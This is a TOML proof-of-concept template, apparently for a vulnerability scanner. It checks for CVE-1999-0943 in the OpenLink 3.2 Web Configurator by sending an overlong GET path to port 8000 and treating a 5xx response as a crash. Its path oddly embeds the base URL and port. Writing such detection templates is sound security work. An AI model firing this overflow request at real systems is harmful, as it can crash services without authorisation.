[info]
author = "ave"
description = "向 OpenLink 3.2 Web 配置器发送超长 GET 请求，触发缓冲区溢出导致服务崩溃或异常响应，验证目标是否存在 CVE-1999-0943 漏洞。"
id = "POC-AVE-1999-1400"
name = "OpenLink 3.2 Web Configurator 远程缓冲区溢出 PoC"
severity = "critical"
tags = ["ave-1999-1400"]
vuln_id = [
    "CVE-1999-0943",
    "AVE-1999-1400",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}:8000/{{repeat_1024}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"
